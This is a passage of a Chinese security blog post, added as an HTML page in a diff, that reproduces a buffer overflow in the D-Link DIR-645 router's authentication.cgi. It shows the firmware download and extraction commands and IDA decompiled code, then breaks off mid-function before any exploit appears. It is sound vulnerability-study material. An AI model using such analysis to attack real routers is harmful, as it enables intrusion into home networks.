@@ -1,0 +1,1983 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>D-Link-DIR-645溢出漏洞复现 | ABf1ag&#39;s blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            <script src="https://eqcn.ajz.miesnfu.com/wp-content/plugins/wp-3d-pony/live2dw/lib/L2Dwidget.min.js"></script>
+        
+            <script src="/live2d/index.js"></script>
+        
+            <script src="/meihua/index.js"></script>
+        
+    
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ABf1ag's blog" type="application/atom+xml">
+</head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
+      <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
+      <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/about" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-link" aria-hidden="true"></i>
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/yuang01/hexo-theme-bamboo">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">ABf1ag&#39;s blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/about" class="menu-item-link" title="关于">
+                  
+                    <i class="fas fa-user" aria-hidden="true"></i>
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                    <i class="fas fa-link" aria-hidden="true"></i>
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/yuang01/hexo-theme-bamboo" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+    <div id="he-plugin-simple"></div>
+    <script>
+      WIDGET = {
+        CONFIG: {
+          "modules": "012",
+          "background": 5,
+          "tmpColor": "4A4A4A",
+          "tmpSize": 16,
+          "cityColor": "4A4A4A",
+          "citySize": 16,
+          "aqiSize": 16,
+          "weatherIconSize": 24,
+          "alertIconSize": 18,
+          "padding": "10px 10px 10px 10px",
+          "shadow": "1",
+          "language": "auto",
+          "borderRadius": 5,
+          "fixed": "false",
+          "vertical": "middle",
+          "horizontal": "center",
+          "key": "2784dd3fcb1e4f0f9a9b579bf69641f2"
+        }
+      }
+    </script>
+    <script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script> 
+    
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/8.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        D-Link-DIR-645溢出漏洞复现
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2023-04-28 |
+        </span>
+      
+
+      
+
+      
+        <div class="post-detail-header_wordcount">
+          <span class="totalcount">
+            <i class="fas fa-file-text-o"></i> 字数统计: 3.8k |
+          </span>
+  
+          <span class="min2read">
+            <i class="fas fa-clock"></i> 阅读时长: 19分钟 |
+          </span>
+  
+          
+            <span class="reading">
+              <i class="fas fa-eye"></i> 阅读量：<span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+        </div>
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h3 id="D-Link-DIR-645溢出漏洞复现"><a href="#D-Link-DIR-645溢出漏洞复现" class="headerlink" title="D-Link-DIR-645溢出漏洞复现"></a>D-Link-DIR-645溢出漏洞复现</h3><span id="more"></span>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本以为照着书可以完成复现，但书上的固件貌似和我的不太一样，可能是我下的固件更新了吧，也可能是真机环境不一样(<del>概率很小</del>)，搜了很多博客也没有提到后面的检查代码，不管了，硬刚吧。</p>
+<h3 id="固件下载及提取"><a href="#固件下载及提取" class="headerlink" title="固件下载及提取"></a>固件下载及提取</h3><p>固件下载地址:<a target="_blank" rel="noopener" href="http://files.dlink.com.au/Products/DIR-645/REV_A/Firmware/DIR645_FW103B11/">http://files.dlink.com.au/Products/DIR-645/REV_A/Firmware/DIR645_FW103B11/</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip DIR645A1_FW103B11.zip#解压</span><br><span class="line">binwalk -e DIR645A1_FW103B11.bin#提取 </span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据《揭秘家用路由器0day漏洞挖掘技术》，已知漏洞组件是authentication.cgi,其指向和上一篇文章一样指向cigbin，将其托入ida中分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall authenticationcgi_main(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *request_method; // $s1</span><br><span class="line">  int v4; // $s5</span><br><span class="line">  char *v5; // $s4</span><br><span class="line">  int v6; // $s1</span><br><span class="line">  unsigned int v7; // $s0</span><br><span class="line">  int v8; // $a3</span><br><span class="line">  int v9; // $a2</span><br><span class="line">  unsigned int v10; // $v0</span><br><span class="line">  int *v11; // $s0</span><br><span class="line">  unsigned int v12; // $hi</span><br><span class="line">  char v13; // $a0</span><br><span class="line">  int v14; // $s0</span><br><span class="line">  ssize_t v15; // $v1</span><br><span class="line">  int v16; // $s1</span><br><span class="line">  unsigned int v17; // $s0</span><br><span class="line">  char *v18; // $v0</span><br><span class="line">  char *v19; // $s0</span><br><span class="line">  int v20; // $s0</span><br><span class="line">  int v21; // $v0</span><br><span class="line">  const char **v22; // $s2</span><br><span class="line">  int i; // $s1</span><br><span class="line">  const char *v24; // $s0</span><br><span class="line">  char *v25; // $v0</span><br><span class="line">  const char *v26; // $a1</span><br><span class="line">  const char *v27; // $a2</span><br><span class="line">  int v28; // $v0</span><br><span class="line">  int v29; // $s0</span><br><span class="line">  _DWORD *v30; // $s3</span><br><span class="line">  _DWORD *v31; // $s4</span><br><span class="line">  _DWORD *v32; // $s2</span><br><span class="line">  int v33; // $s1</span><br><span class="line">  const char *v34; // $s0</span><br><span class="line">  char *string; // $v0</span><br><span class="line">  char *v36; // $v0</span><br><span class="line">  struct sysinfo *v37; // $s1</span><br><span class="line">  size_t v38; // $v0</span><br><span class="line">  size_t v39; // $s2</span><br><span class="line">  int v40; // $s0</span><br><span class="line">  int v41; // $v0</span><br><span class="line">  struct sysinfo *v42; // $s1</span><br><span class="line">  size_t v43; // $v0</span><br><span class="line">  size_t v44; // $s2</span><br><span class="line">  int v45; // $s0</span><br><span class="line">  int v46; // $v0</span><br><span class="line">  char *v47; // $v0</span><br><span class="line">  const char *v48; // $s4</span><br><span class="line">  int v49; // $s3</span><br><span class="line">  unsigned int v50; // $s0</span><br><span class="line">  char *v52; // [sp+10h] [-F58h]</span><br><span class="line">  int v53; // [sp+20h] [-F48h] BYREF</span><br><span class="line">  char v54[16]; // [sp+24h] [-F44h] BYREF</span><br><span class="line">  struct sysinfo v55; // [sp+34h] [-F34h] BYREF</span><br><span class="line">  char v56[128]; // [sp+74h] [-EF4h] BYREF</span><br><span class="line">  char v57[128]; // [sp+F4h] [-E74h] BYREF</span><br><span class="line">  int v58[33]; // [sp+174h] [-DF4h] BYREF</span><br><span class="line">  char v59[128]; // [sp+1F8h] [-D70h] BYREF</span><br><span class="line">  unsigned int v60; // [sp+278h] [-CF0h]</span><br><span class="line">  int v61[58]; // [sp+27Ch] [-CECh] BYREF</span><br><span class="line">  unsigned int v62; // [sp+364h] [-C04h] BYREF</span><br><span class="line">  int v63; // [sp+368h] [-C00h]</span><br><span class="line">  char v64[160]; // [sp+3ACh] [-BBCh] BYREF</span><br><span class="line">  char v65[256]; // [sp+44Ch] [-B1Ch] BYREF</span><br><span class="line">  int v66[67]; // [sp+54Ch] [-A1Ch] BYREF</span><br><span class="line">  int v67[97]; // [sp+658h] [-910h] BYREF</span><br><span class="line">  char v68[256]; // [sp+7DCh] [-78Ch] BYREF</span><br><span class="line">  char v69[132]; // [sp+8DCh] [-68Ch] BYREF</span><br><span class="line">  char v70[512]; // [sp+960h] [-608h] BYREF</span><br><span class="line">  char v71[1024]; // [sp+B60h] [-408h] BYREF</span><br><span class="line">  char *haystack; // [sp+F60h] [-8h]</span><br><span class="line">  char *dest; // [sp+F64h] [-4h]</span><br><span class="line"></span><br><span class="line">  request_method = getenv(&quot;REQUEST_METHOD&quot;);</span><br><span class="line">  memset(v61, 0, sizeof(v61));</span><br><span class="line">  memset(v67, 0, sizeof(v67));</span><br><span class="line">  memset(v58, 0, sizeof(v58));</span><br><span class="line">  v4 = sub_40A370((const char *)*a2);</span><br><span class="line">  if ( !request_method )</span><br><span class="line">    goto LABEL_95;</span><br><span class="line">  if ( v4 == 1 || v4 == 3 )                     // 如果调用logout.cgi</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = 